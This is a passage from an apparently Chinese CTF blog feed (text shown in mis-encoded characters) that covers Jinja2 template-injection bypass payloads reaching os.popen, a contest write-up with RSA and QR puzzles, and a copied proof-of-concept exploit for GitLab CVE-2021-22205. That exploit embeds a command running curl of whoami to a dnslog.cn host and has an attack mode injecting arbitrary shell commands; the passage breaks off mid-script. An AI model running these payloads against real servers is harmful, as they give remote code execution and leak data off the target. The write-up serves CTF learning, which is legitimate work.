code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span> <span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__class__"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token comment">#é‚£ä¹ˆ</span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token comment">#å°±å¯ä»¥æ”¹å†™ä¸º</span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__class__"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__base__"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__subclasses__"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__getitem__"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#æ³¨æ„è¿™é‡Œä¸èƒ½ç›´æ¥[117]ï¼Œåˆ«é—®ä¸ºä»€ä¹ˆï¼Œæˆ‘è¯•äº†ä¸è¡Œ</span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__class__"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__base__"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__subclasses__"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__getitem__"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__init__"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__globals__"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"popen"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"ls /"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token comment">#æŒ‰ç†è¯´è¿™æ ·å°±å¯ä»¥äº†ï¼Œå¯æ˜¯æˆ‘æµ‹è¯•äº†å‘ç°è¿‡ä¸å»å“</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="åˆ©ç”¨ä¸­æ‹¬å·-ç»•è¿‡"><a href="#åˆ©ç”¨ä¸­æ‹¬å·-ç»•è¿‡" class="headerlink" title="åˆ©ç”¨ä¸­æ‹¬å·[ ]ç»•è¿‡"></a>åˆ©ç”¨ä¸­æ‹¬å·[ ]ç»•è¿‡</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">[</span><span class="token string">"__class__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"__base__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"__subclasses__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"__init__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"__globals__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"popen"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>`
ä¹Ÿå°±æ˜¯
`<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



]]></content>
      <categories>
        <category>çŸ¥è¯†ç‚¹</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬å…­å±Šå¼ºç½‘æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ›åˆèµ›</title>
    <url>/2023/11/13/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E5%9B%BD%E9%99%85%E7%B2%BE%E8%8B%B1%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<p><img src="https://img-blog.csdnimg.cn/629b0fc893fc43df905a434be60d8555.png" alt="1"></p>
<h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><p>base64è§£å¯†</p>
<h3 id="ä¸€çœ¼çœ‹å‡º"><a href="#ä¸€çœ¼çœ‹å‡º" class="headerlink" title="ä¸€çœ¼çœ‹å‡º"></a>ä¸€çœ¼çœ‹å‡º</h3><p><strong>è´¹é©¬å®šç†</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag
<span class="token keyword">import</span> gmpy2


flag<span class="token operator">=</span><span class="token string">b''</span>

r <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>

a <span class="token operator">=</span> <span class="token number">11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span>

p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>a <span class="token operator">-</span> r<span class="token punctuation">)</span>
q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> r<span class="token punctuation">)</span>

n <span class="token operator">=</span> p<span class="token operator">*</span>q

<span class="token keyword">def</span> <span class="token function">enc</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">65537</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>


c <span class="token operator">=</span> enc<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n ='</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c ='</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>

<span class="token comment"># ('n =', mpz(121027298948349995679677982412648544403333177260975245569073983061538581058440163574922807151182889153495253964764966037308461724272151584478723275142858008261257709817963330011376266261119767294949088397671360123321149414700981035517299807126625758046100840667081332434968770862731073693976604061597575813313L))</span>
<span class="token comment"># ('c =', mpz(42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267L))</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ ¹æ®ä»¥ä¸‹ä»£ç æ±‚å‡ºpã€q</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime
r <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>

a <span class="token operator">=</span> <span class="token number">11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span>

p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>a <span class="token operator">-</span> r<span class="token punctuation">)</span>
q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> r<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span>
<span class="token comment">#p=11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span>

<span class="token comment">#q=11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263465587</span>

<span class="token comment">#n=121027298948349995679677982412648544403333177260975245569073983061538581058440163574922807151182889153495253964764966037308461724272151584478723275142858008261257709817963330011376266261119767294949088397671360123321149414700981035517299807126625758046100840667081332434968770862731073693976604061597575813313</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç›²çŒœe&#x3D;65537<br>å¯†æ–‡cå·²ç»ç»™å‡º</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">c<span class="token operator">=</span><span class="token number">42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>æœ€ç»ˆè„šæœ¬:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2

e <span class="token operator">=</span> <span class="token number">65537</span>

p <span class="token operator">=</span> <span class="token number">11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span>
q <span class="token operator">=</span> <span class="token number">11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263465587</span>
n <span class="token operator">=</span> p <span class="token operator">*</span> q
<span class="token comment"># å¯†æ–‡</span>
c <span class="token operator">=</span> <span class="token number">42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267</span>

d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># æ±‚æ˜æ–‡</span>
M <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>  <span class="token comment"># å¿«é€Ÿæ±‚å¹‚å–æ¨¡è¿ç®—</span>

<span class="token comment"># Convert the plaintext to a string</span>
M_str <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># Convert M to hexadecimal and remove the '0x' prefix</span>
M_bytes <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>M_str<span class="token punctuation">)</span>  <span class="token comment"># Convert the hexadecimal string to bytes</span>
M_str_final <span class="token operator">=</span> M_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment"># Decode bytes to UTF-8 string</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>M_str_final<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æˆ–è€…ä½¿ç”¨rsaè§£å¯†å·¥å…·<br><img src="https://img-blog.csdnimg.cn/ad455aeee45246fbaf257543b70001ad.png" alt="2"></p>
<h3 id="å›½é™…è±¡æ£‹ä¸äºŒç»´ç ï¼š"><a href="#å›½é™…è±¡æ£‹ä¸äºŒç»´ç ï¼š" class="headerlink" title="å›½é™…è±¡æ£‹ä¸äºŒç»´ç ï¼š"></a>å›½é™…è±¡æ£‹ä¸äºŒç»´ç ï¼š</h3><p><img src="https://img-blog.csdnimg.cn/90005912edcb4bdcb16217985d73a064.png" alt="23"><br>ç”¨è¿™ä¸ªå›¾ç‰‡è·ŸåŸå›¾ç‰‡ å¼‚æˆ–<br><img src="https://img-blog.csdnimg.cn/f606096be1794c0aac580ef70f990176.png" alt="5"><br>æ‰«ç å°±æ˜¯flag</p>
<h3 id="æ–°å‹è½¦è”ç½‘å®‰å…¨ç½‘ç»œåè®®ç ´è§£ï¼ˆé˜¶æ®µä¸€ï¼‰"><a href="#æ–°å‹è½¦è”ç½‘å®‰å…¨ç½‘ç»œåè®®ç ´è§£ï¼ˆé˜¶æ®µä¸€ï¼‰" class="headerlink" title="æ–°å‹è½¦è”ç½‘å®‰å…¨ç½‘ç»œåè®®ç ´è§£ï¼ˆé˜¶æ®µä¸€ï¼‰"></a>æ–°å‹è½¦è”ç½‘å®‰å…¨ç½‘ç»œåè®®ç ´è§£ï¼ˆé˜¶æ®µä¸€ï¼‰</h3><p>è¿ä¸ŠVPNåè®¿é—®é¡µé¢å‘ç°æ˜¯gitlabï¼Œç‰ˆæœ¬13.9ï¼Œæ‰¾åˆ°<a href="https://github.com/Al1ex/CVE-2021-22205">CVE-2021-22205</a><br>ä½¿ç”¨è„šæœ¬ç›´æ¥æ‰“ï¼Œå¯æ˜¯æ•´äº†åŠå¤©ä½¿ç”¨è„šæœ¬ä¸€ç›´æ‰“ä¸é€šğŸ˜¶â€ğŸŒ«ï¸ï¼Œä¸é¶æœºè¿æ¥ä¸ä¸Šï¼Œå€Ÿä¸€ä¸ªæ”¹è¿‡çš„poc<br>å€Ÿé‰´äº<a href="https://mp.weixin.qq.com/s/LyxgB7YFM0RcZSN5hmZF9Q">è¿™é‡Œ</a>â¬…ï¸</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> socks
<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup
requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">"""
   ______     _______     ____   ___ ____  _      ____  ____  ____   ___  ____  
  / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \|___ \|___ \ / _ \| ___| 
 | |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | __) | __) | | | |___ \ 
 | |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/ / __/ / __/| |_| |___) |
  \____ |  \_/  |_____|   |_____|\___/_____|_|    |_____|_____|_____|\___/|____/ 

                                  Author:Al1ex@Heptagram
                                Github:https://github.com/Al1ex                         
     """</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
        éªŒè¯æ¨¡å¼ï¼špython CVE-2021-22205.py -v true -t target_url 
        æ”»å‡»æ¨¡å¼ï¼špython CVE-2021-22205.py -a true -t target_url -c command 
        æ‰¹é‡æ£€æµ‹ï¼špython CVE-2021-22205.py -s true -f file 
        '''</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        req1 <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target_url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/users/sign_in"</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>req1<span class="token punctuation">.</span>text<span class="token punctuation">,</span> features<span class="token operator">=</span><span class="token string">"lxml"</span><span class="token punctuation">)</span>
        token <span class="token operator">=</span> soup<span class="token punctuation">.</span>findAll<span class="token punctuation">(</span><span class="token string">'meta'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token string">"\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&amp;TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx&#123;curl `whoami`.82sm53.dnslog.cn&#125; . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"</span>
        headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"</span><span class="token punctuation">,</span>
            <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">,</span>
            <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5"</span><span class="token punctuation">,</span>
            <span class="token string">"X-CSRF-Token"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">&#125;</span>
        flag <span class="token operator">=</span> <span class="token string">'Failed to process image'</span>
        req2 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target_url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/uploads/user"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> flag <span class="token keyword">in</span> req2<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] ç›®æ ‡ &#123;&#125; å­˜åœ¨æ¼æ´"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] ç›®æ ‡ &#123;&#125; ä¸å­˜åœ¨æ¼æ´"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>
    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        req1 <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target_url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/users/sign_in"</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>req1<span class="token punctuation">.</span>text<span class="token punctuation">,</span> features<span class="token operator">=</span><span class="token string">"lxml"</span><span class="token punctuation">)</span>
        token <span class="token operator">=</span> soup<span class="token punctuation">.</span>findAll<span class="token punctuation">(</span><span class="token string">'meta'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token string">"\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&amp;TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx&#123;"</span><span class="token operator">+</span>  command <span class="token operator">+</span><span class="token string">"&#125; . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"</span>
        headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"</span><span class="token punctuation">,</span>
            <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">,</span>
            <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5"</span><span class="token punctuation">,</span>
            <span class="token string">"X-CSRF-Token"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">&#125;</span>
        flag <span class="token operator">=</span> <span class="token string">'Failed to process image'</span>
        req2 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target_url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/uploads/user"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> flag <span class="token keyword">in</span> req2<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] ç›®æ ‡ &#123;&#125; å­˜åœ¨æ¼æ´"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] è¯·åˆ°dnslogæˆ–ä¸»æœºæ£€æŸ¥æ‰§è¡Œç»“æœ"</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] ç›®æ ‡ &#123;&#125; ä¸å­˜åœ¨æ¼æ´"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> url_link <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> url_link<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">:</span>
                url_path <span class="token operator">=</span> format_url<span class="token punctuation">(</span>url_link<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                check<span class="token punctuation">(</span>url_path<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">format_url</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
